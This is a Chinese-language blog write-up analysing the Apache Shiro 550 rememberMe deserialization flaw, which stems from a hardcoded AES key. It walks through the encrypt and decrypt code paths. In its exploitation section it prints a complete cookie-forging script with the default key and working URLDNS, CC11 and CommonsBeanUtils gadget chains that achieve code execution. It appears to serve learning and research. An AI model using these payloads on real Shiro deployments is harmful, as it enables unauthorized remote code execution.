---
title: Java反序列化-Shiro550
date: 2026-03-27
category: Java
tags: ["web", "ctf", "Java反序列化"]
excerpt: 硬编码?让我rce！
---

# Java反序列化-Shiro550

## 0x01 写在前面

这周感觉没什么状态，Shiro已经拖了很久了，周四翘课赶紧打一下（感觉平时不逃课根本没啥时间学新东西哈哈

## 0x02 Shiro初识

Apache Shiro是一个强大易用的Java安全框架，提供了认证、授权、加密和会话管理等功能

Shiro框架直观、易用，同时也能提供健壮的安全性

## 0x03 漏洞原理

Apache Shiro框架提供了记住密码的功能（RememberMe），用户登录成功后会将用户的登录信息加密编码，然后存储在Cookie中。对于服务端，如果检测到用户的Cookie，首先会读取rememberMe的Cookie值，然后进行base64解码，然后进行AES解密再反序列化

反过来思考一下，如果我们构造该值为一个cc链序列化后的字符串，并使用该密钥进行AES加密后再进行base64编码，那么这时候服务端就会去进行反序列化我们的payload内容，这样就可以达到命令执行的效果，流程如下：

```Plain
获取rememberMe值 -> Base64解密 -> AES解密 -> 调用readobject反序列化操作
```

**shiro550 的根本原因：固定 key 加密**

## 0x04 环境搭建

参考Drunkbaby师傅的文章

https://drun1baby.top/2022/07/10/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Shiro%E7%AF%8701-Shiro550%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/

## 0x05 漏洞分析

### 漏洞点

登录的 username 和 password 默认是 root 与 secret

填写用户名和密码后勾选remember选项，服务端就会生成一个Cookie来记住你的登录信息

![img](https://raw.githubusercontent.com/GEN-d233/gengar/refs/heads/main/public/Shiro550/S1.png)

Shiro550的特征是响应包中包含`remember=deleteMe`字段，在登录之后生成了一串base64来作为登录用户的Cookie。实际上后端是对用户登录信息进行序列化，然后进行AES加密后base64，这便是我们的Cookie

### 加密过程

既然漏洞出现在Cookie的序列化，就全局搜索Shiro包下Cookie生成的相关内容

`CookieRememberMeManager.rememberSerializedIdentity()`方法如下：

![img](https://raw.githubusercontent.com/GEN-d233/gengar/refs/heads/main/public/Shiro550/S2.png)

对其进行分析，做的事情很简单

```Java
protected void rememberSerializedIdentity(Subject subject, byte[] serialized) {

    //判断断传入的 subject 对象是否为HttpServletRequest类型
    if (!WebUtils.isHttp(subject)) {
        if (log.isDebugEnabled()) {
            String msg = "Subject argument is not an HTTP-aware instance.  This is required to obtain a servlet " +
                    "request and response in order to set the rememberMe cookie. Returning immediately and " +
                    "ignoring rememberMe operation.";
            log.debug(msg);
        }
        return;
    }


    HttpServletRequest request = WebUtils.getHttpRequest(subject);
    HttpServletResponse response = WebUtils.getHttpResponse(subject);

    //将序列化字符串进行Base64加密并设置为Cookie
    String base64 = Base64.encodeToString(serialized);

    Cookie template = getCookie();
    Cookie cookie = new SimpleCookie(template);
    cookie.setValue(base64);
    cookie.saveTo(request, response);
}
```

查看谁调用了该方法，是`AbstractRememberMeManager.rememberIdentity()`方法

先对传入的byte通过`convertPrincipalsToBytes()`方法处理，再传递给`rememberSerializedIdentity()`

![img](https://raw.githubusercontent.com/GEN-d233/gengar/refs/heads/main/public/Shiro550/S3.png)

继续查看方法的调用，在`AbstractRememberMeManager.onSuccessfulLogin()`

![img](https://raw.githubusercontent.com/GEN-d233/gengar/refs/heads/main/public/Shiro550/S4.png)

该方法最终被`AbstractRememberMeManager.rememberMeSuccessfulLogin()`调用，这里应该就是`remeberMe`的功能点了，这里下个断点调试

![img](https://raw.githubusercontent.com/GEN-d233/gengar/refs/heads/main/public/Shiro550/S5.png)

跟进到`onSuccessfulLogin()`方法中，调用`forgetIdentity()`方法对`subject`进行处理，`subject`对象表示单个用户的状态和安全操作，包含认证、授权等，这里直接跳过看后面的逻辑

先判断`token`的`remeberMe`字段是否为true，然后进入`rememberIdentity()`

![img](https://raw.githubusercontent.com/GEN-d233/gengar/refs/heads/main/public/Shiro550/S6.png)

在`rememberIdentity()`中，调用了`convertPrincipalsToBytes()`将身份信息转换为字节数组

![img](https://raw.githubusercontent.com/GEN-d233/gengar/refs/heads/main/public/Shiro550/S7.png)

跟进看看`onvertPrincipalsToBytes()`如何实现

```Java
protected byte[] convertPrincipalsToBytes(PrincipalCollection principals) {
    //序列化用户信息
    byte[] bytes = serialize(principals);
    //存在加密服务时调用encrypt()对序列化的用户信息进行加密
    if (getCipherService() != null) {
        bytes = encrypt(bytes);
    }
    return bytes;
}
```

跟进`encrypt()`查看加密逻辑

![img](https://raw.githubusercontent.com/GEN-d233/gengar/refs/heads/main/public/Shiro550/S8.png)

```Java
protected byte[] encrypt(byte[] serialized) {
    //获取序列化字节数组
    byte[] value = serialized;
    //启动一个加密服务
    CipherService cipherService = getCipherService();
    if (cipherService != null) {
        //使用加密服务对serialized进行加密
        ByteSource byteSource = cipherService.encrypt(serialized, getEncryptionCipherKey());
        value = byteSource.getBytes();
    }
    return value;
}
```

可以在调试面板看到实际上使用的加密算法是AES

![img]()

同时注意到`getEncryptionCipherKey()`返回的是加密的密钥，跟进，返回`encryptionCipherKey`，查看Value write

![img](https://raw.githubusercontent.com/GEN-d233/gengar/refs/heads/main/public/Shiro550/S9.png)

`setEncryptionCipherKey()`实现了`encryptionCipherKey`的赋值

```Java
public void setEncryptionCipherKey(byte[] encryptionCipherKey) {
    this.encryptionCipherKey = encryptionCipherKey;
}
```

查看调用，在`setCipherKey()`方法

![img](https://raw.githubusercontent.com/GEN-d233/gengar/refs/heads/main/public/Shiro550/S10.png)

接下来是调用`setCipherKey()`的`AbstractRememberMeManager()`，发现传递给`setCipherKey()`的参数是类里面的属性*`DEFAULT_CIPHER_KEY_BYTES`*

![img](https://raw.githubusercontent.com/GEN-d233/gengar/refs/heads/main/public/Shiro550/S11.png)

查看发现该属性为常量，这里就是漏洞利用的关键点

```Java
private static final byte[] DEFAULT_CIPHER_KEY_BYTES = Base64.decode("kPH+bIxk5D2deZiIxcaaaA==");
```

加密完成后，回到`rememberIdentity()`，bytes就是加密之后的cookie

`rememberSerializedIdentity()`，最终将我们加密之后的Cookie先进行base64编码，再存储到当前会话的Cookie中

### 解密过程

下面我们来调试一下解密过程，在`AbstractRememberMeManager.getRememberedPrincipals()`下一个断点进行调试

![img](https://raw.githubusercontent.com/GEN-d233/gengar/refs/heads/main/public/Shiro550/S12.png)

在bp中发个包，注意此时我们要把Cookie中的sessionID删除，不然后端不会解析我们的加密串

![img](https://raw.githubusercontent.com/GEN-d233/gengar/refs/heads/main/public/Shiro550/S13.png)

进入`getRememberedSerializedIdentity()`，先获取Cookie值，再对其进行Base64解码

![img](https://raw.githubusercontent.com/GEN-d233/gengar/refs/heads/main/public/Shiro550/S14.png)

接着进入`convertBytesToPrincipals()`，调用`decrypt()`对字节数组进行解码

![img](https://raw.githubusercontent.com/GEN-d233/gengar/refs/heads/main/public/Shiro550/S15.png)

跟进`decrypt()`，获取密钥后进行AES解密方法

![img](https://raw.githubusercontent.com/GEN-d233/gengar/refs/heads/main/public/Shiro550/S16.png)

对字节数组解密完成后将其反序列化

![img](https://raw.githubusercontent.com/GEN-d233/gengar/refs/heads/main/public/Shiro550/S17.png)

![img](https://raw.githubusercontent.com/GEN-d233/gengar/refs/heads/main/public/Shiro550/S18.png)

以上就是完整的Cookie解密过程

## 0x06 漏洞利用

### AES加密脚本

使用该将利用链的exp生成的bin文件进行AES加密后传入Cookie字段

```Python
from Crypto.Cipher import AES
import uuid
import base64
 
def convert_bin(file):
    with open(file,'rb') as f:
        return f.read()
 
 
def AES_enc(data):
    BS=AES.block_size
    pad=lambda s:s+((BS-len(s)%BS)*chr(BS-len(s)%BS)).encode()
    key="kPH+bIxk5D2deZiIxcaaaA=="
    mode=AES.MODE_CBC
    iv=uuid.uuid4().bytes
    encryptor=AES.new(base64.b64decode(key),mode,iv)
    ciphertext=base64.b64encode(iv+encryptor.encrypt(pad(data))).decode()
    return ciphertext
 
if __name__=="__main__":
    data=convert_bin("ser.bin")
    print(AES_enc(data))
```

### URLDNS链

```Java
package org.example;

import java.io.*;
import java.util.HashMap;
import java.net.URL;
import java.lang.reflect.Field;

public class DNSURL {
    public static void main(String[] args) throws Exception{
        HashMap map=new HashMap();
        URL url=new URL("http://scrk6r.dnslog.cn");

        Class clazz=Class.forName("java.net.URL");
        Field hashcode=clazz.getDeclaredField("hashCode");
        hashcode.setAccessible(true);
        hashcode.set(url,123);
//        System.out.println(hashcode.get(url));
        map.put(url,"test");
        hashcode.set(url,-1);

        serialize(map);
//        unserialize("ser.bin");


    }

    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream oos=new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }

    public static Object unserialize(String Filename) throws IOException,ClassNotFoundException{
        ObjectInputStream ois=new ObjectInputStream(new FileInputStream(Filename));
        Object object=ois.readObject();
        return object;
    }
}
```

用脚本机密后放入Cookie中，记得删除JSESSIONID否则服务端不会解析Cookie

![img](https://raw.githubusercontent.com/GEN-d233/gengar/refs/heads/main/public/Shiro550/S19.png)

完成DNS查询，说明反序列化成功

![img](https://raw.githubusercontent.com/GEN-d233/gengar/refs/heads/main/public/Shiro550/S21.png)

### CC链

在shiro中，默认其实是没有CC依赖的，所以在测试学习的时候需要我们在maven中手动添加上CC3.2.1依赖

尝试使用CC6这条对CC和jdk版本没有限制的链来攻击，传入payload发现没有反应，查看服务器日志，无法加载`Transformer`数组类

在我们反序列化的时候，在`readObject`之前，初始化了一个`ClassResolvingObjectInputStream`类，调用它的`readObject()`，调用Transformer数组类时无法找到`Transformer.class`的路径，但是并不存在这个路径，因此Shiro无法反序列化Transformers数组，具体原因看https://goodapple.top/archives/139

总而言之使用CC链时无法使用`Transformer`数组类

在我前面的博客中的标准CC11链中，结合了CC2和CC6的特点，用了`InvokerTransformer`类来加载，后半条链使用的是动态加载类，这样可以绕过Transformers数组，前半条链使用`HashMap`类

```Java
package org.example;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.HashMap;
import java.util.Map;

// 改进版 CC11 EXP
public class CC11test {
public static void main(String[] args) throws Exception{
    byte[] code = Files.readAllBytes(Paths.get("D://Task/test.class"));
    TemplatesImpl templates = new TemplatesImpl();
    setFieldValue(templates, "_name", "Calc");
    setFieldValue(templates, "_bytecodes", new byte[][] {code});
    setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());
    InvokerTransformer invokerTransformer = new InvokerTransformer("newTransformer", new Class[]{}, new Object[]{});
//        ChainedTransformer chainedTransformer = new ChainedTransformer(invokerTransformer);  
    HashMap<Object, Object> hashMap = new HashMap<>();
//        Map lazyMap = LazyMap.decorate(hashMap, chainedTransformer);  
    Map lazyMap = LazyMap.decorate(hashMap, new ConstantTransformer("five")); // 防止在反序列化前弹计算器
    TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, templates);
    HashMap<Object, Object> expMap = new HashMap<>();
    expMap.put(tiedMapEntry, "value");
    lazyMap.remove(templates);

    // 在 put 之后通过反射修改值
    setFieldValue(lazyMap, "factory", invokerTransformer);

    serialize(expMap);
//    unserialize("ser.bin");
}

        public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception{
            Field field = obj.getClass().getDeclaredField(fieldName);
            field.setAccessible(true);
            field.set(obj, value);
        }

        public static void serialize(Object obj) throws IOException {
            ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
            oos.writeObject(obj);
        }
        public static Object unserialize(String Filename) throws IOException, ClassNotFoundException{
            ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
            Object obj = ois.readObject();
            return obj;
        }
}
```

反序列化成功

![img](https://raw.githubusercontent.com/GEN-d233/gengar/refs/heads/main/public/Shiro550/S22.png)

### CB链

在Shiro中没有CC依赖，但是有一个叫`commons-beanutils`的依赖。这个依赖主要是扩充了JavaBean语法，能够动态调用符合JavaBean的类方法，前面我已经写过这条链子了，这里直接给exp

```Java
package org.example;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.beanutils.BeanComparator;

import java.io.*;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.PriorityQueue;

public class CommonsBeanUtils {
    public static void main(String[] args) throws Exception {
        byte[] code = Files.readAllBytes(Paths.get("D://Task/test.class"));
        TemplatesImpl templates = new TemplatesImpl();
        setFieldValue(templates, "_name", "Calc");
        setFieldValue(templates, "_bytecodes", new byte[][] {code});
        setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());
        BeanComparator beanComparator = new BeanComparator();

        PriorityQueue priorityQueue = new PriorityQueue(1,beanComparator);
        priorityQueue.add(1);
        priorityQueue.add(1);

        setFieldValue(beanComparator, "property", "outputProperties");
        setFieldValue(priorityQueue,"queue", new Object[]{templates, templates});

        serialize(priorityQueue);
//        unserialize("ser.bin");
    }

    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception{
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }

    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }

    public static Object unserialize(String filename) throws IOException, ClassNotFoundException {
        ObjectInput ois = new ObjectInputStream(new FileInputStream(filename));
        Object obj = ois.readObject();
        return obj;
    }


}
```

![img](https://raw.githubusercontent.com/GEN-d233/gengar/refs/heads/main/public/Shiro550/S23.png)

没打通的话可能是`commons-beanutils`依赖的版本不一致

## 0x07 自动化工具

shiro反序列化漏洞综合利用工具，Shrio一把梭，大人食大便了

https://github.com/SummerSec/ShiroAttack2

![img](https://raw.githubusercontent.com/GEN-d233/gengar/refs/heads/main/public/Shiro550/S24.png)

## 0x08 写在后面

还是没能克服懒癌...

然后就是有时间把CC11和CB链重新挖一挖吧

参考

https://goodapple.top/archives/139

https://drun1baby.github.io/2022/07/10/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Shiro%E7%AF%8701-Shiro550%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/
